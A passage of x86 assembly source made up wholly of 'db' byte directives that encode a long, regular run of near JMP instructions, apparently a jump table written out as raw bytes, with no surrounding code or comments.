    db 2Bh,19h,00h,00h,0E9h,26h,19h,00h,00h,0E9h,21h,19h,00h,00h,0E9h,1Ch
    db 19h,00h,00h,0E9h,17h,19h,00h,00h,0E9h,12h,19h,00h,00h,0E9h,0Dh,19h
    db 00h,00h,0E9h,08h,19h,00h,00h,0E9h,03h,19h,00h,00h,0E9h,0FEh,18h,00h
    db 00h,0E9h,0F9h,18h,00h,00h,0E9h,0F4h,18h,00h,00h,0E9h,0EFh,18h,00h,00h
    db 0E9h,0EAh,18h,00h,00h,0E9h,0E5h,18h,00h,00h,0E9h,0E0h,18h,00h,00h,0E9h
    db 0DBh,18h,00h,00h,0E9h,0D6h,18h,00h,00h,0E9h,0D1h,18h,00h,00h,0E9h,0CCh
    db 18h,00h,00h,0E9h,0C7h,18h,00h,00h,0E9h,0C2h,18h,00h,00h,0E9h,0BDh,18h
    db 00h,00h,0E9h,0B8h,18h,00h,00h,0E9h,0B3h,18h,00h,00h,0E9h,0AEh,18h,00h
    db 00h,0E9h,0A9h,18h,00h,00h,0E9h,0A4h,18h,00h,00h,0E9h,9Fh,18h,00h,00h
    db 0E9h,9Ah,18h,00h,00h,0E9h,95h,18h,00h,00h,0E9h,90h,18h,00h,00h,0E9h
    db 8Bh,18h,00h,00h,0E9h,86h,18h,00h,00h,0E9h,81h,18h,00h,00h,0E9h,7Ch
    db 18h,00h,00h,0E9h,77h,18h,00h,00h,0E9h,72h,18h,00h,00h,0E9h,6Dh,18h
    db 00h,00h,0E9h,68h,18h,00h,00h,0E9h,63h,18h,00h,00h,0E9h,5Eh,18h,00h
    db 00h,0E9h,59h,18h,00h,00h,0E9h,54h,18h,00h,00h,0E9h,4Fh,18h,00h,00h
    db 0E9h,4Ah,18h,00h,00h,0E9h,45h,18h,00h,00h,0E9h,40h,18h,00h,00h,0E9h
    db 3Bh,18h,00h,00h,0E9h,36h,18h,00h,00h,0E9h,31h,18h,00h,00h,0E9h,2Ch
    db 18h,00h,00h,0E9h,27h,18h,00h,00h,0E9h,22h,18h,00h,00h,0E9h,1Dh,18h
    db 00h,00h,0E9h,18h,18h,00h,00h,0E9h,13h,18h,00h,00h,0E9h,0Eh,18h,00h
    db 00h,0E9h,09h,18h,00h,00h,0E9h,04h,18h,00h,00h,0E9h,0FFh,17h,00h,00h
    db 0E9h,0FAh,17h,00h,00h,0E9h,0F5h,17h,00h,00h,0E9h,0F0h,17h,00h,00h,0E9h
    db 0EBh,17h,00h,00h,0E9h,0E6h,17h,00h,00h,0E9h,0E1h,17h,00h,00h,0E9h,0DCh
    db 17h,00h,00h,0E9h,0D7h,17h,00h,00h,0E9h,0D2h,17h,00h,00h,0E9h,0CDh,17h
    db 00h,00h,0E9h,0C8h,17h,00h,00h,0E9h,0C3h,17h,00h,00h,0E9h,0BEh,17h,00h
    db 00h,0E9h,0B9h,17h,00h,00h,0E9h,0B4h,17h,00h,00h,0E9h,0AFh,17h,00h,00h
    db 0E9h,0AAh,17h,00h,00h,0E9h,0A5h,17h,00h,00h,0E9h,0A0h,17h,00h,00h,0E9h
    db 9Bh,17h,00h,00h,0E9h,96h,17h,00h,00h,0E9h,91h,17h,00h,00h,0E9h,8Ch
    db 17h,00h,00h,0E9h,87h,17h,00h,00h,0E9h,82h,17h,00h,00h,0E9h,7Dh,17h
    db 00h,00h,0E9h,78h,17h,00h,00h,0E9h,73h,17h,00h,00h,0E9h,6Eh,17h,00h
    db 00h,0E9h,69h,17h,00h,00h,0E9h,64h,17h,00h,00h,0E9h,5Fh,17h,00h,00h
    db 0E9h,5Ah,17h,00h,00h,0E9h,55h,17h,00h,00h,0E9h,50h,17h,00h,00h,0E9h
    db 4Bh,17h,00h,00h,0E9h,46h,17h,00h,00h,0E9h,41h,17h,00h,00h,0E9h,3Ch
    db 17h,00h,00h,0E9h,37h,17h,00h,00h,0E9h,32h,17h,00h,00h,0E9h,2Dh,17h
    db 00h,00h,0E9h,28h,17h,00h,00h,0E9h,23h,17h,00h,00h,0E9h,1Eh,17h,00h
    db 00h,0E9h,19h,17h,00h,00h,0E9h,14h,17h,00h,00h,0E9h,0Fh,17h,00h,00h
    db 0E9h,0Ah,17h,00h,00h,0E9h,05h,17h,00h,00h,0E9h,00h,17h,00h,00h,0E9h
    db 0FBh,16h,00h,00h,0E9h,0F6h,16h,00h,00h,0E9h,0F1h,16h,00h,00h,0E9h,0ECh
    db 16h,00h,00h,0E9h,0E7h,16h,00h,00h,0E9h,0E2h,16h,00h,00h,0E9h,0DDh,16h
    db 00h,00h,0E9h,0D8h,16h,00h,00h,0E9h,0D3h,16h,00h,00h,0E9h,0CEh,16h,00h
    db 00h,0E9h,0C9h,16h,00h,00h,0E9h,0C4h,16h,00h,00h,0E9h,0BFh,16h,00h,00h
    db 0E9h,0BAh,16h,00h,00h,0E9h,0B5h,16h,00h,00h,0E9h,0B0h,16h,00h,00h,0E9h
    db 0ABh,16h,00h,00h,0E9h,0A6h,16h,00h,00h,0E9h,0A1h,16h,00h,00h,0E9h,9Ch
    db 16h,00h,00h,0E9h,97h,16h,00h,00h,0E9h,92h,16h,00h,00h,0E9h,8Dh,16h
    db 00h,00h,0E9h,88h,16h,00h,00h,0E9h,83h,16h,00h,00h,0E9h,7Eh,16h,00h
    db 00h,0E9h,79h,16h,00h,00h,0E9h,74h,16h,00h,00h,0E9h,6Fh,16h,00h,00h
    db 0E9h,6Ah,16h,00h,00h,0E9h,65h,16h,00h,00h,0E9h,60h,16h,00h,00h,0E9h
    db 5Bh,16h,00h,00h,0E9h,56h,16h,00h,00h,0E9h,51h,16h,00h,00h,0E9h,4Ch
    db 16h,00h,00h,0E9h,47h,16h,00h,00h,0E9h,42h,16h,00h,00h,0E9h,3Dh,16h
    db 00h,00h,0E9h,38h,16h,00h,00h,0E9h,33h,16h,00h,00h,0E9h,2Eh,16h,00h
    db 00h,0E9h,29h,16h,00h,00h,0E9h,24h,16h,00h,00h,0E9h,1Fh,16h,00h,00h
    db 0E9h,1Ah,16h,00h,00h,0E9h,15h,16h,00h,00h,0E9h,10h,16h,00h,00h,0E9h
    db 0Bh,16h,00h,00h,0E9h,06h,16h,00h,00h,0E9h,01h,16h,00h,00h,0E9h,0FCh
    db 15h,00h,00h,0E9h,0F7h,15h,00h,00h,0E9h,0F2h,15h,00h,00h,0E9h,0EDh,15h
    db 00h,00h,0E9h,0E8h,15h,00h,00h,0E9h,0E3h,15h,00h,00h,0E9h,0DEh,15h,00h
    db 00h,0E9h,0D9h,15h,00h,00h,0E9h,0D4h,15h,00h,00h,0E9h,0CFh,15h,00h,00h
    db 0E9h,0CAh,15h,00h,00h,0E9h,0C5h,15h,00h,00h,0E9h,0C0h,15h,00h,00h,0E9h
    db 0BBh,15h,00h,00h,0E9h,0B6h,15h,00h,00h,0E9h,0B1h,15h,00h,00h,0E9h,0ACh
    db 15h,00h,00h,0E9h,0A7h,15h,00h,00h,0E9h,0A2h,15h,00h,00h,0E9h,9Dh,15h
    db 00h,00h,0E9h,98h,15h,00h,00h,0E9h,93h,15h,00h,00h,0E9h,8Eh,15h,00h
    db 00h,0E9h,89h,15h,00h,00h,0E9h,84h,15h,00h,00h,0E9h,7Fh,15h,00h,00h
    db 0E9h,7Ah,15h,00h,00h,0E9h,75h,15h,00h,00h,0E9h,70h,15h,00h,00h,0E9h
    db 6Bh,15h,00h,00h,0E9h,66h,15h,00h,00h,0E9h,61h,15h,00h,00h,0E9h,5Ch
    db 15h,00h,00h,0E9h,57h,15h,00h,00h,0E9h,52h,15h,00h,00h,0E9h,4Dh,15h
    db 00h,00h,0E9h,48h,15h,00h,00h,0E9h,43h,15h,00h,00h,0E9h,3Eh,15h,00h
    db 00h,0E9h,39h,15h,00h,00h,0E9h,34h,15h,00h,00h,0E9h,2Fh,15h,00h,00h
    db 0E9h,2Ah,15h,00h,00h,0E9h,25h,15h,00h,00h,0E9h,20h,15h,00h,00h,0E9h
    db 1Bh,15h,00h,00h,0E9h,16h,15h,00h,00h,0E9h,11h,15h,00h,00h,0E9h,0Ch
    db 15h,00h,00h,0E9h,07h,15h,00h,00h,0E9h,02h,15h,00h,00h,0E9h,0FDh,14h
    db 00h,00h,0E9h,0F8h,14h,00h,00h,0E9h,0F3h,14h,00h,00h,0E9h,0EEh,14h,00h
    db 00h,0E9h,0E9h,14h,00h,00h,0E9h,0E4h,14h,00h,00h,0E9h,0DFh,14h,00h,00h
    db 0E9h,0DAh,14h,00h,00h,0E9h,0D5h,14h,00h,00h,0E9h,0D0h,14h,00h,00h,0E9h
    db 0CBh,14h,00h,00h,0E9h,0C6h,14h,00h,00h,0E9h,0C1h,14h,00h,00h,0E9h,0BCh
    db 14h,00h,00h,0E9h,0B7h,14h,00h,00h,0E9h,0B2h,14h,00h,00h,0E9h,0ADh,14h
    db 00h,00h,0E9h,0A8h,14h,00h,00h,0E9h,0A3h,14h,00h,00h,0E9h,9Eh,14h,00h
    db 00h,0E9h,99h,14h,00h,00h,0E9h,94h,14h,00h,00h,0E9h,8Fh,14h,00h,00h
    db 0E9h,8Ah,14h,00h,00h,0E9h,85h,14h,00h,00h,0E9h,80h,14h,00h,00h,0E9h
    db 7Bh,14h,00h,00h,0E9h,76h,14h,00h,00h,0E9h,71h,14h,00h,00h,0E9h,6Ch
    db 14h,00h,00h,0E9h,67h,14h,00h,00h,0E9h,62h,14h,00h,00h,0E9h,5Dh,14h
    db 00h,00h,0E9h,58h,14h,00h,00h,0E9h,53h,14h,00h,00h,0E9h,4Eh,14h,00h
    db 00h,0E9h,49h,14h,00h,00h,0E9h,44h,14h,00h,00h,0E9h,3Fh,14h,00h,00h
    db 0E9h,3Ah,14h,00h,00h,0E9h,35h,14h,00h,00h,0E9h,30h,14h,00h,00h,0E9h
    db 2Bh,14h,00h,00h,0E9h,26h,14h,00h,00h,0E9h,21h,14h,00h,00h,0E9h,1Ch
    db 14h,00h,00h,0E9h,17h,14h,00h,00h,0E9h,12h,14h,00h,00h,0E9h,0Dh,14h
    db 00h,00h,0E9h,08h,14h,00h,00h,0E9h,03h,14h,00h,00h,0E9h,0FEh,13h,00h
    db 00h,0E9h,0F9h,13h,00h,00h,0E9h,0F4h,13h,00h,00h,0E9h,0EFh,13h,00h,00h
    db 0E9h,0EAh,13h,00h,00h,0E9h,0E5h,13h,00h,00h,0E9h,0E0h,13h,00h,00h,0E9h
    db 0DBh,13h,00h,00h,0E9h,0D6h,13h,00h,00h,0E9h,0D1h,13h,00h,00h,0E9h,0CCh
    db 13h,00h,00h,0E9h,0C7h,13h,00h,00h,0E9h,0C2h,13h,00h,00h,0E9h,0BDh,13h
    db 00h,00h,0E9h,0B8h,13h,00h,00h,0E9h,0B3h,13h,00h,00h,0E9h,0AEh,13h,00h
    db 00h,0E9h,0A9h,13h,00h,00h,0E9h,0A4h,13h,00h,00h,0E9h,9Fh,13h,00h,00h
    db 0E9h,9Ah,13h,00h,00h,0E9h,95h,13h,00h,00h,0E9h,90h,13h,00h,00h,0E9h
    db 8Bh,13h,00h,00h,0E9h,86h,13h,00h,00h,0E9h,81h,13h,00h,00h,0E9h,7Ch
    db 13h,00h,00h,0E9h,77h,13h,00h,00h,0E9h,72h,13h,00h,00h,0E9h,6Dh,13h
    db 00h,00h,0E9h,68h,13h,00h,00h,0E9h,63h,13h,00h,00h,0E9h,5Eh,13h,00h
    db 00h,0E9h,59h,13h,00h,00h,0E9h,54h,13h,00h,00h,0E9h,4Fh,13h,00h,00h
    db 0E9h,4Ah,13h,00h,00h,0E9h,45h,13h,00h,00h,0E9h,40h,13h,00h,00h,0E9h
    db 3Bh,13h,00h,00h,0E9h,36h,13h,00h,00h,0E9h,31h,13h,00h,00h,0E9h,2Ch
    db 13h,00h,00h,0E9h,27h,13h,00h,00h,0E9h,22h,13h,00h,00h,0E9h,1Dh,13h
    db 00h,00h,0E9h,18h,13h,00h,00h,0E9h,13h,13h,00h,00h,0E9h,0Eh,13h,00h
    db 00h,0E9h,09h,13h,00h,00h,0E9h,04h,13h,00h,00h,0E9h,0FFh,12h,00h,00h
    db 0E9h,0FAh,12h,00h,00h,0E9h,0F5h,12h,00h,00h,0E9h,0F0h,12h,00h,00h,0E9h
    db 0EBh,12h,00h,00h,0E9h,0E6h,12h,00h,00h,0E9h,0E1h,12h,00h,00h,0E9h,0DCh
    db 12h,00h,00h,0E9h,0D7h,12h,00h,00h,0E9h,0D2h,12h,00h,00h,0E9h,0CDh,12h
    db 00h,00h,0E9h,0C8h,12h,00h,00h,0E9h,0C3h,12h,00h,00h,0E9h,0BEh,12h,00h
    db 00h,0E9h,0B9h,12h,00h,00h,0E9h,0B4h,12h,00h,00h,0E9h,0AFh,12h,00h,00h
    db 0E9h,0AAh,12h,00h,00h,0E9h,0A5h,12h,00h,00h,0E9h,0A0h,12h,00h,00h,0E9h
    db 9Bh,12h,00h,00h,0E9h,96h,12h,00h,00h,0E9h,91h,12h,00h,00h,0E9h,8Ch
    db 12h,00h,00h,0E9h,87h,12h,00h,00h,0E9h,82h,12h,00h,00h,0E9h,7Dh,12h
    db 00h,00h,0E9h,78h,12h,00h,00h,0E9h,73h,12h,00h,00h,0E9h,6Eh,12h,00h
    db 00h,0E9h,69h,12h,00h,00h,0E9h,64h,12h,00h,00h,0E9h,5Fh,12h,00h,00h
    db 0E9h,5Ah,12h,00h,00h,0E9h,55h,12h,00h,00h,0E9h,50h,12h,00h,00h,0E9h
    db 4Bh,12h,00h,00h,0E9h,46h,12h,00h,00h,0E9h,41h,12h,00h,00h,0E9h,3Ch
    db 12h,00h,00h,0E9h,37h,12h,00h,00h,0E9h,32h,12h,00h,00h,0E9h,2Dh,12h
    db 00h,00h,0E9h,28h,12h,00h,00h,0E9h,23h,12h,00h,00h,0E9h,1Eh,12h,00h
    db 00h,0E9h,19h,12h,00h,00h,0E9h,14h,12h,00h,00h,0E9h,0Fh,12h,00h,00h
    db 0E9h,0Ah,12h,00h,00h,0E9h,05h,12h,00h,00h,0E9h,00h,12h,00h,00h,0E9h
    db 0FBh,11h,00h,00h,0E9h,0F6h,11h,00h,00h,0E9h,0F1h,11h,00h,00h,0E9h,0ECh
    db 11h,00h,00h,0E9h,0E7h,11h,00h,00h,0E9h,0E2h,11h,00h,00h,0E9h,0DDh,11h
    db 00h,00h,0E9h,0D8h,11h,00h,00h,0E9h,0D3h,11h,00h,00h,0E9h,0CEh,11h,00h
    db 00h,0E9h,0C9h,11h,00h,00h,0E9h,0C4h,11h,00h,00h,0E9h,0BFh,11h,00h,00h
    db 0E9h,0BAh,11h,00h,00h,0E9h,0B5h,11h,00h,00h,0E9h,0B0h,11h,00h,00h,0E9h
    db 0ABh,11h,00h,00h,0E9h,0A6h,11h,00h,00h,0E9h,0A1h,11h,00h,00h,0E9h,9Ch
    db 11h,00h,00h,0E9h,97h,11h,00h,00h,0E9h,92h,11h,00h,00h,0E9h,8Dh,11h
    db 00h,00h,0E9h,88h,11h,00h,00h,0E9h,83h,11h,00h,00h,0E9h,7Eh,11h,00h
    db 00h,0E9h,79h,11h,00h,00h,0E9h,74h,11h,00h,00h,0E9h,6Fh,11h,00h,00h
    db 0E9h,6Ah,11h,00h,00h,0E9h,65h,11h,00h,00h,0E9h,60h,11h,00h,00h,0E9h
    db 5Bh,11h,00h,00h,0E9h,56h,11h,00h,00h,0E9h,51h,11h,00h,00h,0E9h,4Ch
    db 11h,00h,00h,0E9h,47h,11h,00h,00h,0E9h,42h,11h,00h,00h,0E9h,3Dh,11h
    db 00h,00h,0E9h,38h,11h,00h,00h,0E9h,33h,11h,00h,00h,0E9h,2Eh,11h,00h
    db 00h,0E9h,29h,11h,00h,00h,0E9h,24h,11h,00h,00h,0E9h,1Fh,11h,00h,00h
    db 0E9h,1Ah,11h,00h,00h,0E9h,15h,11h,00h,00h,0E9h,10h,11h,00h,00h,0E9h
    db 0Bh,11h,00h,00h,0E9h,06h,11h,00h,00h,0E9h,01h,11h,00h,00h,0E9h,0FCh
    db 10h,00h,00h,0E9h,0F7h,10h,00h,00h,0E9h,0F2h,10h,00h,00h,0E9h,0EDh,10h
    db 00h,00h,0E9h,0E8h,10h,00h,00h,0E9h,0E3h,10h,00h,00h,0E9h,0DEh,10h,00h
    db 00h,0E9h,0D9h,10h,00h,00h,0E9h,0D4h,10h,00h,00h,0E9h,0CFh,10h,00h,00h
    db 0E9h,0CAh,10h,00h,00h,0E9h,0C5h,10h,00h,00h,0E9h,0C0h,10h,00h,00h,0E9h
    db 0BBh,10h,00h,00h,0E9h,0B6h,10h,00h,00h,0E9h,0B1h,10h,00h,00h,0E9h,0ACh
    db 10h,00h,00h,0E9h,0A7h,10h,00h,00h,0E9h,0A2h,10h,00h,00h,0E9h,9Dh,10h
    db 00h,00h,0E9h,98h,10h,00h,00h,0E9h,93h,10h,00h,00h,0E9h,8Eh,10h,00h
    db 00h,0E9h,89h,10h,00h,00h,0E9h,84h,10h,00h,00h,0E9h,7Fh,10h,00h,00h
    db 0E9h,7Ah,10h,00h,00h,0E9h,75h,10h,00h,00h,0E9h,70h,10h,00h,00h,0E9h
    db 6Bh,10h,00h,00h,0E9h,66h,10h,00h,00h,0E9h,61h,10h,00h,00h,0E9h,5Ch
    db 10h,00h,00h,0E9h,57h,10h,00h,00h,0E9h,52h,10h,00h,00h,0E9h,4Dh,10h
    db 00h,00h,0E9h,48h,10h,00h,00h,0E9h,43h,10h,00h,00h,0E9h,3Eh,10h,00h
    db 00h,0E9h,39h,10h,00h,00h,0E9h,34h,10h,00h,00h,0E9h,2Fh,10h,00h,00h
    db 0E9h,2Ah,10h,00h,00h,0E9h,25h,10h,00h,00h,0E9h,20h,10h,00h,00h,0E9h
    db 1Bh,10h,00h,00h,0E9h,16h,10h,00h,00h,0E9h,11h,10h,00h,00h,0E9h,0Ch
    db 10h,00h,00h,0E9h,07h,10h,00h,00h,0E9h,02h,10h,00h,00h,0E9h,0FDh,0Fh
    db 00h,00h,0E9h,0F8h,0Fh,00h,00h,0E9h,0F3h,0Fh,00h,00h,0E9h,0EEh,0Fh,00h
    db 00h,0E9h,0E9h,0Fh,00h,00h,0E9h,0E4h,0Fh,00h,00h,0E9h,0DFh,0Fh,00h,00h
    db 0E9h,0DAh,0Fh,00h,00h,0E9h,0D5h,0Fh,00h,00h,0E9h,0D0h,0Fh,00h,00h,0E9h
    db 0CBh,0Fh,00h,00h,0E9h,0C6h,0Fh,00h,00h,0E9h,0C1h,0Fh,00h,00h,0E9h,0BCh
    db 0Fh,00h,00h,0E9h,0B7h,0Fh,00h,00h,0E9h,0B2h,0Fh,00h,00h,0E9h,0ADh,0Fh
    db 00h,00h,0E9h,0A8h,0Fh,00h,00h,0E9h,0A3h,0Fh,00h,00h,0E9h,9Eh,0Fh,00h
    db 00h,0E9h,99h,0Fh,00h,00h,0E9h,94h,0Fh,00h,00h,0E9h,8Fh,0Fh,00h,00h
    db 0E9h,8Ah,0Fh,00h,00h,0E9h,85h,0Fh,00h,00h,0E9h,80h,0Fh,00h,00h,0E9h
    db 7Bh,0Fh,00h,00h,0E9h,76h,0Fh,00h,00h,0E9h,71h,0Fh,00h,00h,0E9h,6Ch
    db 0Fh,00h,00h,0E9h,67h,0Fh,00h,00h,0E9h,62h,0Fh,00h,00h,0E9h,5Dh,0Fh
    db 00h,00h,0E9h,58h,0Fh,00h,00h,0E9h,53h,0Fh,00h,00h,0E9h,4Eh,0Fh,00h
    db 00h,0E9h,49h,0Fh,00h,00h,0E9h,44h,0Fh,00h,00h,0E9h,3Fh,0Fh,00h,00h
    db 0E9h,3Ah,0Fh,00h,00h,0E9h,35h,0Fh,00h,00h,0E9h,30h,0Fh,00h,00h,0E9h
    db 2Bh,0Fh,00h,00h,0E9h,26h,0Fh,00h,00h,0E9h,21h,0Fh,00h,00h,0E9h,1Ch
    db 0Fh,00h,00h,0E9h,17h,0Fh,00h,00h,0E9h,12h,0Fh,00h,00h,0E9h,0Dh,0Fh
    db 00h,00h,0E9h,08h,0Fh,00h,00h,0E9h,03h,0Fh,00h,00h,0E9h,0FEh,0Eh,00h
    db 00h,0E9h,0F9h,0Eh,00h,00h,0E9h,0F4h,0Eh,00h,00h,0E9h,0EFh,0Eh,00h,00h
    db 0E9h,0EAh,0Eh,00h,00h,0E9h,0E5h,0Eh,00h,00h,0E9h,0E0h,0Eh,00h,00h,0E9h
    db 0DBh,0Eh,00h,00h,0E9h,0D6h,0Eh,00h,00h,0E9h,0D1h,0Eh,00h,00h,0E9h,0CCh
    db 0Eh,00h,00h,0E9h,0C7h,0Eh,00h,00h,0E9h,0C2h,0Eh,00h,00h,0E9h,0BDh,0Eh
    db 00h,00h,0E9h,0B8h,0Eh,00h,00h,0E9h,0B3h,0Eh,00h,00h,0E9h,0AEh,0Eh,00h
    db 00h,0E9h,0A9h,0Eh,00h,00h,0E9h,0A4h,0Eh,00h,00h,0E9h,9Fh,0Eh,00h,00h
    db 0E9h,9Ah,0Eh,00h,00h,0E9h,95h,0Eh,00h,00h,0E9h,90h,0Eh,00h,00h,0E9h
    db 8Bh,0Eh,00h,00h,0E9h,86h,0Eh,00h,00h,0E9h,81h,0Eh,00h,00h,0E9h,7Ch
    db 0Eh,00h,00h,0E9h,77h,0Eh,00h,00h,0E9h,72h,0Eh,00h,00h,0E9h,6Dh,0Eh
    db 00h,00h,0E9h,68h,0Eh,00h,00h,0E9h,63h,0Eh,00h,00h,0E9h,5Eh,0Eh,00h
    db 00h,0E9h,59h,0Eh,00h,00h,0E9h,54h,0Eh,00h,00h,0E9h,4Fh,0Eh,00h,00h
    db 0E9h,4Ah,0Eh,00h,00h,0E9h,45h,0Eh,00h,00h,0E9h,40h,0Eh,00h,00h,0E9h
    db 3Bh,0Eh,00h,00h,0E9h,36h,0Eh,00h,00h,0E9h,31h,0Eh,00h,00h,0E9h,2Ch
    db 0Eh,00h,00h,0E9h,27h,0Eh,00h,00h,0E9h,22h,0Eh,00h,00h,0E9h,1Dh,0Eh
    db 00h,00h,0E9h,18h,0Eh,00h,00h,0E9h,13h,0Eh,00h,00h,0E9h,0Eh,0Eh,00h
    db 00h,0E9h,09h,0Eh,00h,00h,0E9h,04h,0Eh,00h,00h,0E9h,0FFh,0Dh,00h,00h
    db 0E9h,0FAh,0Dh,00h,00h,0E9h,0F5h,0Dh,00h,00h,0E9h,0F0h,0Dh,00h,00h,0E9h
    db 0EBh,0Dh,00h,00h,0E9h,0E6h,0Dh,00h,00h,0E9h,0E1h,0Dh,00h,00h,0E9h,0DCh
    db 0Dh,00h,00h,0E9h,0D7h,0Dh,00h,00h,0E9h,0D2h,0Dh,00h,00h,0E9h,0CDh,0Dh
    db 00h,00h,0E9h,0C8h,0Dh,00h,00h,0E9h,0C3h,0Dh,00h,00h,0E9h,0BEh,0Dh,00h
    db 00h,0E9h,0B9h,0Dh,00h,00h,0E9h,0B4h,0Dh,00h,00h,0E9h,0AFh,0Dh,00h,00h
    db 0E9h,0AAh,0Dh,00h,00h,0E9h,0A5h,0Dh,00h,00h,0E9h,0A0h,0Dh,00h,00h,0E9h
    db 9Bh,0Dh,00h,00h,0E9h,96h,0Dh,00h,00h,0E9h,91h,0Dh,00h,00h,0E9h,8Ch
    db 0Dh,00h,00h,0E9h,87h,0Dh,00h,00h,0E9h,82h,0Dh,00h,00h,0E9h,7Dh,0Dh
    db 00h,00h,0E9h,78h,0Dh,00h,00h,0E9h,73h,0Dh,00h,00h,0E9h,6Eh,0Dh,00h
    db 00h,0E9h,69h,0Dh,00h,00h,0E9h,64h,0Dh,00h,00h,0E9h,5Fh,0Dh,00h,00h
    db 0E9h,5Ah,0Dh,00h,00h,0E9h,55h,0Dh,00h,00h,0E9h,50h,0Dh,00h,00h,0E9h
    db 4Bh,0Dh,00h,00h,0E9h,46h,0Dh,00h,00h,0E9h,41h,0Dh,00h,00h,0E9h,3Ch
    db 0Dh,00h,00h,0E9h,37h,0Dh,00h,00h,0E9h,32h,0Dh,00h,00h,0E9h,2Dh,0Dh
    db 00h,00h,0E9h,28h,0Dh,00h,00h,0E9h,23h,0Dh,00h,00h,0E9h,1Eh,0Dh,00h
    db 00h,0E9h,19h,0Dh,00h,00h,0E9h,14h,0Dh,00h,00h,0E9h,0Fh,0Dh,00h,00h
    db 0E9h,0Ah,0Dh,00h,00h,0E9h,05h,0Dh,00h,00h,0E9h,00h,0Dh,00h,00h,0E9h
    db 0FBh,0Ch,00h,00h,0E9h,0F6h,0Ch,00h,00h,0E9h,0F1h,0Ch,00h,00h,0E9h,0ECh
    db 0Ch,00h,00h,0E9h,0E7h,0Ch,00h,00h,0E9h,0E2h,0Ch,00h,00h,0E9h,0DDh,0Ch
    db 00h,00h,0E9h,0D8h,0Ch,00h,00h,0E9h,0D3h,0Ch,00h,00h,0E9h,0CEh,0Ch,00h
    db 00h,0E9h,0C9h,0Ch,00h,00h,0E9h,0C4h,0Ch,00h,00h,0E9h,0BFh,0Ch,00h,00h
    db 0E9h,0BAh,0Ch,00h,00h,0E9h,0B5h,0Ch,00h,00h,0E9h,0B0h,0Ch,00h,00h,0E9h
    db 0ABh,0Ch,00h,00h,0E9h,0A6h,0Ch,00h,00h,0E9h,0A1h,0Ch,00h,00h,0E9h,9Ch
    db 0Ch,00h,00h,0E9h,97h,0Ch,00h,00h,0E9h,92h,0Ch,00h,00h,0E9h,8Dh,0Ch
    db 00h,00h,0E9h,88h,0Ch,00h,00h,0E9h,83h,0Ch,00h,00h,0E9h,7Eh,0Ch,00h
    db 00h,0E9h,79h,0Ch,00h,00h,0E9h,74h,0Ch,00h,00h,0E9h,6Fh,0Ch,00h,00h
    db 0E9h,6Ah,0Ch,00h,00h,0E9h,65h,0Ch,00h,00h,0E9h,60h,0Ch,00h,00h,0E9h
    db 5Bh,0Ch,00h,00h,0E9h,56h,0Ch,00h,00h,0E9h,51h,0Ch,00h,00h,0E9h,4Ch
    db 0Ch,00h,00h,0E9h,47h,0Ch,00h,00h,0E9h,42h,0Ch,00h,00h,0E9h,3Dh,0Ch
    db 00h,00h,0E9h,38h,0Ch,00h,00h,0E9h,33h,0Ch,00h,00h,0E9h,2Eh,0Ch,00h
    db 00h,0E9h,29h,0Ch,00h,00h,0E9h,24h,0Ch,00h,00h,0E9h,1Fh,0Ch,00h,00h
    db 0E9h,1Ah,0Ch,00h,00h,0E9h,15h,0Ch,00h,00h,0E9h,10h,0Ch,00h,00h,0E9h
    db 0Bh,0Ch,00h,00h,0E9h,06h,0Ch,00h,00h,0E9h,01h,0Ch,00h,00h,0E9h,0FCh
    db 0Bh,00h,00h,0E9h,0F7h,0Bh,00h,00h,0E9h,0F2h,0Bh,00h,00h,0E9h,0EDh,0Bh
    db 00h,00h,0E9h,0E8h,0Bh,00h,00h,0E9h,0E3h,0Bh,00h,00h,0E9h,0DEh,0Bh,00h
    db 00h,0E9h,0D9h,0Bh,00h,00h,0E9h,0D4h,0Bh,00h,00h,0E9h,0CFh,0Bh,00h,00h
    db 0E9h,0CAh,0Bh,00h,00h,0E9h,0C5h,0Bh,00h,00h,0E9h,0C0h,0Bh,00h,00h,0E9h
    db 0BBh,0Bh,00h,00h,0E9h,0B6h,0Bh,00h,00h,0E9h,0B1h,0Bh,00h,00h,0E9h,0ACh
    db 0Bh,00h,00h,0E9h,0A7h,0Bh,00h,00h,0E9h,0A2h,0Bh,00h,00h,0E9h,9Dh,0Bh
    db 00h,00h,0E9h,98h,0Bh,00h,00h,0E9h,93h,0Bh,00h,00h,0E9h,8Eh,0Bh,00h
    db 00h,0E9h,89h,0Bh,00h,00h,0E9h,84h,0Bh,00h,00h,0E9h,7Fh,0Bh,00h,00h
    db 0E9h,7Ah,0Bh,00h,00h,0E9h,75h,0Bh,00h,00h,0E9h,70h,0Bh,00h,00h,0E9h
    db 6Bh,0Bh,00h,00h,0E9h,66h,0Bh,00h,00h,0E9h,61h,0Bh,00h,00h,0E9h,5Ch
    db 0Bh,00h,00h,0E9h,57h,0Bh,00h,00h,0E9h,52h,0Bh,00h,00h,0E9h,4Dh,0Bh
    db 00h,00h,0E9h,48h,0Bh,00h,00h,0E9h,43h,0Bh,00h,00h,0E9h,3Eh,0Bh,00h
    db 00h,0E9h,39h,0Bh,00h,00h,0E9h,34h,0Bh,00h,00h,0E9h,2Fh,0Bh,00h,00h
    db 0E9h,2Ah,0Bh,00h,00h,0E9h,25h,0Bh,00h,00h,0E9h,20h,0Bh,00h,00h,0E9h
    db 1Bh,0Bh,00h,00h,0E9h,16h,0Bh,00h,00h,0E9h,11h,0Bh,00h,00h,0E9h,0Ch
    db 0Bh,00h,00h,0E9h,07h,0Bh,00h,00h,0E9h,02h,0Bh,00h,00h,0E9h,0FDh,0Ah
    db 00h,00h,0E9h,0F8h,0Ah,00h,00h,0E9h,0F3h,0Ah,00h,00h,0E9h,0EEh,0Ah,00h
    db 00h,0E9h,0E9h,0Ah,00h,00h,0E9h,0E4h,0Ah,00h,00h,0E9h,0DFh,0Ah,00h,00h
    db 0E9h,0DAh,0Ah,00h,00h,0E9h,0D5h,0Ah,00h,00h,0E9h,0D0h,0Ah,00h,00h,0E9h
    db 0CBh,0Ah,00h,00h,0E9h,0C6h,0Ah,00h,00h,0E9h,0C1h,0Ah,00h,00h,0E9h,0BCh
    db 0Ah,00h,00h,0E9h,0B7h,0Ah,00h,00h,0E9h,0B2h,0Ah,00h,00h,0E9h,0ADh,0Ah
    db 00h,00h,0E9h,0A8h,0Ah,00h,00h,0E9h,0A3h,0Ah,00h,00h,0E9h,9Eh,0Ah,00h
    db 00h,0E9h,99h,0Ah,00h,00h,0E9h,94h,0Ah,00h,00h,0E9h,8Fh,0Ah,00h,00h
    db 0E9h,8Ah,0Ah,00h,00h,0E9h,85h,0Ah,00h,00h,0E9h,80h,0Ah,00h,00h,0E9h
